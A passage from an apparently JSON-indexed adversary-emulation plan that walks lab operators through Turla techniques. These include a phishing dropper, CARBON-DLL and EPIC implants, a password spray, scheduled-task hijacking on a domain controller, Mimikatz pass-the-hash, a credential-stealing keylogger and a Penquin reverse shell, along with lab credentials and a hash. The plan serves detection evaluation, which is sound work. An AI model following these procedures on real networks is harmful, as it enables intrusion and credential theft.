admin accounts with weak passwords, one of which successfully mounts the C:\\ drive of the domain controller."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ From the \"smbclient\" tab on the Kali Linux machine, copy the password spray script to hobgoblin:","â¡ï¸ Return to your RDP session to hobgoblin as Gunter.","â¡ï¸ Open a Windows Command Prompt and execute the password spray script.","â Verify that the script successfully sprays Frieda's password by checking that output matches the following:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Password spray batch script"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/"]},{"i":"test-4-carbon-on-domain-controller","l":"Test 4: Carbon on Domain Controller","p":["\uD83C\uDFA4 Voice Track:","Test 4 emulates execution of CARBON-DLL on the domain controller via scheduled task."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Verify that \\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator task appears in the output.","â¡ï¸ From the \"smbclient\" tab on the Kali Linux machine, copy the Carbon installer executable to Windows host, hobgoblin.","â¡ï¸ In your RDP session to bannik (10.20.10.9), open File Explorer and browse to C:\\Windows\\System32. Order the files by date.","â¡ï¸ Minimize the RDP session to hobgoblin and start a new RDP session to bannik (10.20.10.9) as Frieda:","â¡ï¸ Return to your RDP session to bannik.","â¡ï¸ Return to your RDP session to hobgoblin (10.20.20.102) and from the Admin Command Prompt, copy the 2nd Carbon installer to bannik (10.20.10.9):","â¡ï¸ Return to your RDP session to hobgoblin (10.20.20.102) as Gunter.","â¡ï¸ Return to your RDP session to hobgoblin (10.20.20.102).","From the Admin Command Prompt, execute the following to enumerate schtasks on the domain controller:","In the Command Prompt, press CTRL+F and in the \"Find what:\" field, enter Customer Experience Improvement Program","Open an Admin Command Prompt. Use the following credentials if prompted:","Open File Explorer and browse to C:\\Program Files\\Windows NT\\2028. Validate the existence of a dsntport.dat file. The log file should be growing every~ 20 seconds.","Open File Explorer and browse to C:\\Windows\\System32. Order the files by date.","Open Microsoft Edge.","Password","Password3!","skt\\frieda","The output should contain:","Username","Wait for the command to return and then modify a scheduled task using the discovered password for the domain admin Frieda( https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a).","Wait for the command to return and then start the modified scheduled task on the domain controller."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL installer","Drop components","Create Loader Service","Service registry edits: 1, 2","Start Loader Service","Loader Service","CARBON-DLL Orchestrator","Comms Lib DLL Injection","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Peer to peer communications over named pipes"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]},{"i":"test-5-mimikatz-and-psexec-of-3rd-carbon-installer","l":"Test 5: Mimikatz and PsExec of 3rd Carbon Installer","p":["\uD83C\uDFA4 Voice Track:","Test 5 emulates Turla downloading and executing Mimikatz as terabox.exe in order to perform lateral movement to a second workstation in the domain."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Verify that a new Carbon implant has been registered with the control server.","â Verify that the NTLM hash for adalwolfa is included in the output.","â¡ï¸ From the \"smbclient\" tab on the Kali Linux machine, copy over Mimikatz to bannik (10.20.10.9):","â¡ï¸ From the \"smbclient\" tab on the Kali Linux machine, copy over PsExec and the 3rd Carbon installer to bannik (10.20.10.9):","â¡ï¸ Minimize (do not close) the khabibulin (10.20.20.104) RDP window and return to the RDP session to bannik (10.20.10.9).","â¡ï¸ Minimize (do not close) the RDP window. Start a new RDP session to khabibulin (10.20.20.104) as adalwolfa:","â¡ï¸ Return to your RDP session to bannik (10.20.10.9) as Frieda.","Close any spurious windows","From the existing elevated Windows Command Prompt, execute Mimikatz Pass-the-Hash with PsExec to execute the 3rd Carbon installer on khabibulin (10.20.20.104):","In the Command Prompt, press CTRL+F and in the \"Find what:\" field, enter NTLM : 07d128430a6338f8d537f6b3ae1dc136","NOTE: This command varies slightly from the Detections scenario with the addition of privilege::debug since we are not executing from SYSTEM context.","Open an elevated Windows Command Prompt and execute the following command to dump LSASS:","Open File Explorer and browse to C:\\Windows\\System32. Order the files by date.","Open up Edge, but don't browse to any website just yet. The browser process is needed for Carbon comms lib DLL injection to occur.","Password","Password2!","Return to the File Explorer window in System32.","skt\\adalwolfa","The output should contain:","Username"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Mimikatz","CARBON-DLL installer","Drop components","Create Loader Service","Service registry edits: 1, 2","Start Loader Service","Loader Service","CARBON-DLL Orchestrator","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Report 4: SwissCERT - RUAG Report","Report 9: Symantec - Waterbug New Toolset","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments","https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/"]},{"i":"test-6-keylogger","l":"Test 6: Keylogger","p":["\uD83C\uDFA4 Voice Track:","Test 6 emulates Turla installing a custom keylogger ( wingtsvcupdt.exe) on Adalwolfa's workstation and harvesting credentials from the system."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Type in full, do not copy or autocomplete, http://kagarov/index.html into the address bar and press enter.","â Verify that the keystrokes were logged containing the website information and Adalwolfa's SSH credentials.","â¡ï¸ From the \"smbclient\" tab on the Kali Linux machine, copy over the keylogger to khabibulin (10.20.20.104):","â¡ï¸ Return to your RDP session to khabibulin (10.20.20.104) as adalwolfa.","â¡ï¸ Start a new RDP session to khabibulin (10.20.20.104) as adalwolfa(if no existing RDP from a previous test):","Execute the following command to output the data written to the keylogger file:","From the elevated Windows Command Prompt, CTRL + C to kill the keylogger","Go to line 198 with CTRL + SHIFT + - then type 198","Minimize the elevated Windows Command Prompt","NOTE: This should hang the terminal with the following output:","Open a new non-admin PowerShell terminal","Open an elevated Windows Command Prompt and execute the following command to start the keylogger:","Open Edge.","Password","Password2!","Replace Apache2 Ubuntu Default Page with Adalwolfa's Page","save the file with CTRL + X, Y, enter","Simulate activity as Adalwolfa:","skt\\adalwolfa","sudo nano /var/www/html/index.html","Type do not copy the SSH command: ssh adalwolfa@10.20.10.23","Type do not copy the SSH password Password2! when prompted.","Type exit to exit from the SSH session","Username","Within the SSH session, type do not copy the follow commands as Adalwolfa:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Keylogger","Current hostname discovery","Token manipulation and session discovery to restart in active session","Keylogging hook routine","Set keylogging hook","Active window discovery"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://blog.talosintelligence.com/2021/09/tinyturla.html","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/"]},{"i":"test-7-penquin","l":"Test 7: Penquin","p":["\uD83C\uDFA4 Voice Track:","Test 7 emulates Turla laterally moving to the Linux Apache server and installing Penquin. Once Penquin's sniffer has been installed, a magic packet is sent to the Apache server, from which the sniffer component of Penquin parses the IP address to connect to, and triggers the establishment of a reverse shell."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ From the \"smbclient\" tab on the Kali Linux machine, copy over Penquin and pscp.exe to khabibulin (10.20.20.104):","â¡ï¸ From the \"smbclient\" tab on the Kali Linux machine, copy over plink.exe to khabibulin (10.20.20.104):","â¡ï¸ From your Kali Linux machine, open a new terminal tab using Ctrl+Shift+T. Rename the new tab to Penquin NC","â¡ï¸ Return to your RDP session to khabibulin (10.20.20.104) as adalwolfa.","â¡ï¸ Switch to your RDP session to khabibulin (10.20.20.104) or, if one was not opened from a previous step, open a new RDP session to khabibulin (10.20.20.104) as adalwolfa:","In the new tab, set up a Netcat listener for Penquin's reverse shell to connect to:","In the terminal where the reverse shell has connected to the Netcat listener, paste the following command to add the watering hole redirection to index.html:","Open an elevated Windows Command Prompt (if no existing admin prompt from a previous step)","Open File Explorer and browse to C:\\Windows\\System32","Open up another terminal tab and name this one to Packet Sender. Run the following commands to send the magic packet to the Apache server using the sendPacket.py utility.","Password","Password2!","Return to the elevated Windows Command Prompt to execute Penquin (Penquin takes ~ 8 seconds to execute).","Return to the File Explorer window in System32.","skt\\adalwolfa","Use the elevated Windows Command Prompt to copy Penquin to the Apache web server using Adalwolfa's credentials.","Username","Wait 1 minute and then send the following command to close the reverse shell","Wait a few seconds and then check the Netcat tab ( Penquin NC). The Netcat prompt should report a successful connection.","Wait for the command to return."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Penquin( Network Sniffer& Penquin Installer)","Writes the sniffer (Penquin) to disk","Moves Penquin to /usr/bin","Creates a service file","Stops cron service","Executes Penquin as cron","Real cron starts as child process","Installs packet sniffer on eth0","Magic packet filter criteria","Execute reverse shell","sendPacket.py"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf","https://securelist.com/the-penquin-turla-2/67962/","https://www.youtube.com/watch?v=JXsjRUxx47Et=647s","https://lab52.io/blog/looking-for-penquins-in-the-wild/","https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/","https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf"]}],[{"l":"Scenario Overview","p":["Legend of symbols:","\uD83D\uDCA1 - callout notes","â - extremely important note","â¡ï¸ - Switching to another session","â­ - Sign out of something"]},{"l":"Setup","p":["â¡ï¸ RDP, do not SSH, to the Kali attacker machine (176.59.15.33).","Open a new terminal window, cd to the cloned repo control server, clear previous server logs, and start the control server:","Ensure that the Carbon and EPIC handlers started up."]},{"i":"step-1---initial-compromise","l":"Step 1 - Initial Compromise","p":["\uD83C\uDFA4 Voice Track:","Step 1 emulates Turla gaining initial access via a spearphishing link sent in an email to the user Gunter.","The link initiates the download of a fake software update executable named NTFVersion.exe. This executable contains another malicious executable, the injector for the EPIC implant.","When the fake updater is run by the user:","The updater writes the embedded injector to the user's path indicated by the%TEMP% environment variable as mxs_installer.exe.","The updater adds a Shell key value to the current user's Winlogon registry key ( HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon), where, upon Windows authentication, the injector will be executed in addition to explorer.exe."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ RDP to hobgoblin (10.20.20.102) as Gunter:","Username","Password","skt\\Gunter","Password1!","Open Microsoft Edge, declining all first-run options, and browse to https://brieftragerin.skt.local/owa. Login:","Open the email from noreply@sktlocal.it and click the link in the email to initiate the download of NTFVersion.exe.","Once the download has been completed, click the downloaded binary to execute it."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["EPIC Dropper","File write of EPIC injector as mxs_installer.exe","Registry modification","EPIC Injector"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68tab=librarydocuments","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf"]},{"i":"step-2---establish-initial-access","l":"Step 2 - Establish Initial Access","p":["\uD83C\uDFA4 Voice Track:","Step 2 emulates Turla establishing initial access and performing initial discovery on the first host.","Eventually, Gunter logs off for the day and logs back in the next day, executing the persistence mechanism for the EPIC implant.","When executed, the mxs_installer.exe will inject EPIC's guard DLL into explorer.exe. After EPIC's guard DLL has been established, it will search for processes that are typically internet enabled (e.g. iexplore.exe, msedge.exe, or firefox.exe) and inject an embedded worker DLL. If the process containing EPIC's worker DLL is killed, EPIC's guard DLL will search for processes again and re-inject the worker DLL.","EPIC's worker DLL will perform user enumeration and several host discovery commands automatically after injection. The output is then written to a log file at %TEMP%\\~D723574.tmp. EPIC then bzip2 compresses and base64 encodes the data before sending the data in an HTTP request to the hardcoded proxy server.","The C2 server responds with a UUID for EPIC to save for future communications. This and all future communications between the C2 server and EPIC are bzip compressed, AES encrypted, and base64 encoded. The AES session key is RSA encrypted and packaged with the data in the HTTP request."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â­ Close out of all tabs and sign out of the RDP session to hobgoblin (10.20.20.102) as Gunter.","â¡ï¸ Wait 2 minutes and then re-RDP to hobgoblin (10.20.20.102) as Gunter:","Username","Password","skt\\Gunter","Password1!","Open Microsoft Edge and browse to https://brieftragerin.skt.local/owa.","â¡ï¸ Set a timer for 2 minutes then switch to your Kali control server terminal and confirm that a new implant has registered and the automated discovery output has been returned in the server log.","NOTE: The injector will wait 2 minutes, before injecting EPIC's Guard DLL into explorer.exe and, subsequently, EPIC's worker DLL into Microsoft Edge."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["AES encrypted","base64 encoded","bzip2 compressed","C2 communications are:","Directory discovery DirectoryDiscovery","EPIC Guard","EPIC Injector","EPIC Payload","Execute commands ExecCmd","Extract EPIC Guard DLL from resources section FindResourceW","Extract EPIC payload DLL from resources section FindResourceW","RSA encrypted AES key","Targeting browser processes for DLL injection","Targeting explorer.exe for DLL injection","User discovery GetAllUsers","Write results to log file WriteResults"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf"]},{"i":"step-3---discovery-and-privilege-escalation","l":"Step 3 - Discovery and Privilege Escalation","p":["\uD83C\uDFA4 Voice Track:","Step 3 emulates Turla performing additional discovery using EPIC and privilege escalation by abusing weak registry permissions.","Once C2 communications have been established between EPIC and the C2 via the proxy server, initial network enumeration is performed on the first host where information about the host device, local and domain groups, and network configurations is collected.","At this point, the domain controller bannik (10.20.10.9) and several domain administrator accounts, including frieda, are discovered. A custom service is also discovered.","Next, additional enumeration of the registry is performed and a weak registry permission for the service ViperVPN is discovered and the binary path is modified to perform privilege escalation.","Eventually the service is restarted manually by a domain admin from the domain controller to emulate the service being restarted via machine reboot. When the service restarts, EPIC will be executed with SYSTEM level privileges.","Note that since this domain admin login is part of a whitecarded service restart, we will not be using this logon session for subsequent activity."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Verify that the ViperVPNSvc service shows up in the tasklist output towards the end.","â¡ï¸ RDP into bannik (10.20.10.9), as Frieda:","â¡ï¸ Switch to your Kali attack station and confirm that a new elevated implant has registered.","â¡ï¸ Wait 1 minute before switching to your RDP session to hobgoblin (10.20.20.102). Minimize (do not close) the hobgoblin (10.20.20.102) RDP window.","Close any spurious windows.","â¹ï¸ Starting the ViperVPN service should take at least 30 seconds and eventually result in an error [SC] StartService FAILED 1053. The EPIC injector will wait an additional 2 minutes before performing injection. If the [SC] StartService FAILED 1053 error occurs in less than 10 seconds and/or you don't receive a new session, contact your Evals lead.","In your lower terminal tab, copy and paste the first set of discovery commands:","Open up an administrative Powershell session and run the following commands to remotely restart the service:","Password","Password3!","skt\\Frieda","This should return:","Username","Wait 1 minute and then â­ sign out of your RDP session to bannik (10.20.10.9) as Frieda","Wait 1 minute before tasking EPIC to modify the misconfigured ViperVPNSvc service to use our implant to execute:","Wait 1 minute before tasking the next command to query the service and who can access it:","Within your Kali control server terminal window, right click and select \"Split Terminal Horizontally\". Be careful not to terminate the control server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["EPIC","Execute commands ExecCmd","Write results to log file WriteResults"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"]},{"i":"step-4---persistence","l":"Step 4 - Persistence","p":["\uD83C\uDFA4 Voice Track:","After successful file writes, the CARBON-DLL installer will create the WinSys Restore Service service, written as WinResSvc, to execute the loader DLL.","C:\\Program Files\\Windows NT\\0511","C:\\Program Files\\Windows NT\\2028","C:\\Program Files\\Windows NT\\Nlts","CAST-128 encrypted configuration file to%programfiles%\\Windows NT\\setuplst.xml","Communications library DLL to %programfiles%\\Windows NT\\msxhlp.dll","Loader DLL to %systemroot%\\System32\\mressvc.dll","On service execution, the loader DLL mressvc.dll will run under svchost and execute the orchestrator DLL MSSVCCFG.dll. The orchestrator DLL will then inject the communications library DLL msxhlp.dll into processes typically using HTTP, such as Internet Explorer. Several configuration, logging, and tasking files are dropped in C:\\Program Files\\Windows NT.","Once the service is set up, the CARBON-DLL installer will start the service before terminating its own execution.","Orchestrator DLL to %programfiles%\\Windows NT\\MSSVCCFG.dll","Step 4 emulates Turla deploying and installing CARBON-DLL as a second stage malware onto Gunter's workstation in order to maintain persistence. CARBON-DLL, a variant of CARBON relying on DLLs and asymmetric encryption, will inject an auxiliary communications module DLL into an existing browser process on Gunter's workstation to establish C2 communications via a redirector using HTTP requests. Once this communication channel is created, the malware will run a few discovery commands on Gunterâs device.","The CARBON-DLL installer then performs two registry writes to make sure that the service can find the loader DLL and that the service will run under svchost:","The CARBON-DLL installer will create the following subdirectories in C:\\Program Files\\Windows NT for tasking-related files and output:","The CARBON-DLL installer will drop the following files to disk:","The loader DLL path is written to registry key HKLM:\\SYSTEM\\CurrentControlSet\\services\\WinResSvc\\Parameters under the ServiceDll value","The service is written to registry key HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost under the WinSysRestoreGroup value"]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ Return to your RDP session to hobgoblin (10.20.20.102) as Gunter","Ensure you have a Microsoft Edge window open with OWA. If not:","Open up Microsoft Edge and browse to https://brieftragerin.skt.local/owa. Login:","Username","Password","skt\\Gunter","Password1!","â¡ï¸ Switch back to your Kali terminal and task the SYSTEM level EPIC implant to download the CARBON-DLL installer:","Once the download has completed successfully, wait 1 minute and then task the EPIC implant to execute the CARBON-DLL installer:","CARBON-DLL should inject into the Microsoft Edge process and beacon back to the C2 server. Check that there is a new Carbon implant session registered with the C2 server","\uD83D\uDCF7 - upload a screenshot of the new implant session.","Wait 1 minute and then task the Carbon implant to execute some discovery commands:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL installer","Drop components","Create Loader Service","Service registry edits: 1, 2","Start Loader Service","Loader Service","CARBON-DLL Orchestrator","Comms Lib DLL Injection","Task Execution","CARBON-DLL Comms Lib","Beacon and task retrieval over HTTP","Upload task output over HTTP","EPIC","File download DownloadFile"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]},{"i":"step-5---lateral-movement-to-domain-controller","l":"Step 5 - Lateral Movement to Domain Controller","p":["\uD83C\uDFA4 Voice Track:","Step 5 emulates Turla laterally moving to the domain controller by conducting password spraying to retrieve a domain admin's credentials to the domain controller and using a scheduled task to gain execution on the domain controller.","CARBON-DLL downloads a batch script which uses sprays several of the discovered domain admin accounts with weak passwords, one of which successfully mounts the C:\\ drive of the domain controller.","In preparation for lateral movement, CARBON-DLL downloads a second copy of its installer and moves it to the System32 directory of the domain controller. Then, the Customer Experience Improvement Program's Consolidator scheduled task is modified to execute the CARBON-DLL installer.","Lastly, CARBON-DLL sends a request to run the modified scheduled task, achieving lateral movement to and execution on the domain controller.","By this point, Frieda has logged into the domain controller to start a browser process as part of legitimate user activity, which the new CARBON-DLL implant injects into to begin kicking off its communication with the C2 server.","Rather than communicate directly to the C2 redirector over HTTP, the new CARBON-DLL implant uses peer-to-peer communication over named pipes through the first CARBON-DLL implant on hobgoblin (10.20.20.102). Discovery commands are then executed, leading to the identification of an Apache web server and the workstation for the administrator of the Apache server, Adalwolfa.","Peer-to-peer communication will occur over the dsnap named pipe on both participating hosts."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Verify that the Consolidator task under the \\Microsoft\\Windows\\Customer Experience Improvement Program\\ task folder appears in the output.","â Verify that the script successfully sprays Frieda's password by checking the task output. You should see task output which states the following. It should take approximately 5 minutes to complete:","â Verify that the Web Servers and Web Server Admins groups are in the output.","â¡ï¸ Return to your control server output and confirm the registration of a new CARBON-DLL implant on the domain controller.","â¡ï¸ Return to your RDP session to hobgoblin (10.20.20.102) as Gunter. Minimize (do not close) the hobgoblin (10.20.20.102) RDP window.","â¡ï¸ Return to your tasking window and task the new CARBON-DLL implant with discovery commands to be run on the domain controller.","â¡ï¸ Wait 1 minute and return to your Kali control server terminal","Close any spurious windows","Ensure khabibulin is in the output and confirm the Description value is\"Adalwolfa Workstation\".","Open up Microsoft Edge (search for Edge if not in toolbar, do not use Edge Beta), decline all first-run start up options, and browse to https://brieftragerin.skt.local/owa","Password","Password3!","skt\\Frieda","Start a new RDP session to bannik (10.20.10.9) as Frieda:","Task CARBON-DLL to download and execute the batch script to spray weak passwords against the domain admin accounts and attempt to mount the C$ drive of the DC.","This should return:","Username","Wait 1 minute and then task CARBON-DLL to download a second version of the CARBON-DLL installer and move it to the System32 folder on the DC via the mounted drive.","Wait 1 minute and then task CARBON-DLL to enumerate both groups for their members.","Wait 1 minute and then task CARBON-DLL to enumerate remote scheduled tasks on the domain controller, using the discovered password for the domain admin Frieda","Wait 1 minute and then task CARBON-DLL to enumerate the Active Directory Computers.","Wait 1 minute and then task CARBON-DLL to modify a remote scheduled task using the discovered password for the domain admin Frieda( https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a).","Wait 1 minute and then task CARBON-DLL to remotely start the modified scheduled task on the domain controller.","Wait 1 minute and then task CARBON-DLL to remove the password spray script."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Password spray batch script","CARBON-DLL installer","Drop components","Create Loader Service","Service registry edits: 1, 2","Start Loader Service","Loader Service","CARBON-DLL Orchestrator","Comms Lib DLL Injection","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Peer to peer communications over named pipes"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]},{"i":"step-6---preparation-for-lateral-movement-onto-second-host","l":"Step 6 - Preparation for Lateral Movement onto Second Host","p":["\uD83C\uDFA4 Voice Track:","Step 6 emulates Turla downloading and executing Mimikatz as terabox.exe after gaining persistance on the machine. Execution of Mimikatz will reveal a cached NTLM hash for the admin user Adalwolfa. This username/hash combination will be used in the next step for lateral movement."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["From your Kali C2 terminal, task the CARBON-DLL implant on the DC to download and execute mimikatz lsadump (note that the file gets downloaded to C:\\Windows\\\\Temp\\ and then gets moved to C:\\Windows\\System32 after download since the CARBON-DLL communications library module cannot download directly to privileged locations):","â Verify that the NTLM hash for adalwolfa is included in the output.","This should return:"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL Orchestrator","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Peer to peer communications over named pipes","Mimikatz"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Report 4: SwissCERT - RUAG Report","Report 9: Symantec - Waterbug New Toolset","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]},{"i":"step-7---lateral-movement-to-second-workstation","l":"Step 7 - Lateral Movement to Second Workstation","p":["\uD83C\uDFA4 Voice Track:","Step 7 emulates Turla preparing for and performing lateral movement to a second workstation in the domain, the Windows workstation belonging to Adalwolfa.","Adalwolfa logs into their workstation khabibulin (10.20.20.104) and opens up Edge to prepare for their legitimate user activity.","In the meantime, the CARBON-DLL implant on the domain controller downloads PsExec and a third copy of the CARBON-DLL installer, downloading both initially to C:\\Windows\\Temp before moving both executables to C:\\Windows\\System32\\.","Next, using the Mimikatz binary previously downloaded to the domain controller and Adalwolfa's discovered NTLM hash, CARBON-DLL performs pass-the-hash to copy the installer to Adalwolfa's workstation and PsExec to remotely execute the installer to install CARBON-DLL on Adalwolfa's workstation."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ Return to your RDP session to bannik (10.20.10.9) as Frieda. Minimize (do not close) the bannik (10.20.10.9) RDP window.","Start a new RDP session to khabibulin (10.20.20.104) as adalwolfa:","Username","Password","skt\\adalwolfa","Password2!","Close any spurious windows","Open up Edge, but don't browse to any website just yet. The browser process is needed for Carbon comms lib DLL injection to occur.","â¡ï¸ Wait 1 minute and return to your Kali control server terminal","Task the CARBON-DLL implant on the domain controller to download PsExec.","Wait 1 minute and then task the CARBON-DLL implant on the domain controller to download a third copy of the CARBON-DLL installer.","Wait 1 minute and then task the CARBON-DLL implant on the domain controller to use the previously downloaded Mimikatz to pass-the-hash and (1) copy the installer to Adalwolfa's workstation and (2) execute it using PsExec.","â Verify that a new Carbon implant has been registered with the control server.","Wait 1 minute and then task the CARBON-DLL implant on the domain controller to clean up dropped files."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["CARBON-DLL installer","Drop components","Create Loader Service","Service registry edits: 1, 2","Start Loader Service","Loader Service","CARBON-DLL Orchestrator","Comms Lib DLL Injection","Task Execution","CARBON-DLL Comms Lib","Beacon and task/payload retrieval over HTTP","Upload task output over HTTP","Peer to peer communications over named pipes","Mimikatz"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments","https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/"]},{"i":"step-8---credential-access-on-admin-host","l":"Step 8 - Credential Access on Admin Host","p":["\uD83C\uDFA4 Voice Track:","Step 8 emulates Turla dropping a custom keylogger binary ( wingtsvcupdt.exe) on Adalwolfa's workstation and harvesting credentials from the system.","Once the tools have been dropped by the CARBON-DLL, the keylogger is executed and begins logging keystrokes to %temp%\\~DFA512.tmp The keylogger is used to collect SSH credentials that Adalwolfa was using on their system while the keylogger was running.","Meanwhile, Adalwolfa is using their Edge browser session to visit the website hosted by the Apache server to check one of the pages. The user then opens PowerShell and connects to the Apache server via SSH, where their plaintext credentials are captured by the keylogger. Adalwolfa then navigates to the directory containing the webpage file on the Apache server and opens the file to make a small change."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Type in full, do not copy or autocomplete, http://kagarov/index.html into the address bar and press enter.","â Verify that the keystrokes were logged containing the website information and Adalwolfa's SSH credentials.","â¡ï¸ Return to the Kali C2 server and task the CARBON-DLL implant on Adalwolfa's workstation to kill the keylogger process.","â¡ï¸ Wait 1 minute and then return to your RDP session to khabibulin (10.20.20.104) as adalwolfa.","From the workstation, as the Adalwolfa user account:","From your Kali C2 server terminal window, task the CARBON-DLL on Adalwolfa's workstation to download and execute the keylogger binary in the background:","Go to line 198 with CTRL + SHIFT + - then type 198","Open a PowerShell terminal and type do not copy the SSH command:","Open Edge.","Replace Apache2 Ubuntu Default Page with Adalwolfa's Page","save the file with CTRL + X, Y, enter","ssh adalwolfa@10.20.10.23","sudo nano /var/www/html/index.html","Type do not copy the SSH password Password2! when prompted.","Type exit to exit from the SSH session","Wait 1 minute and then task the CARBON-DLL implant to exfiltrate the data written to the keylogger file:","Wait 1 minute and then task the CARBON-DLL implant to remove the keylogger and keylogger output file:","Within the SSH session, type do not copy the follow commands as 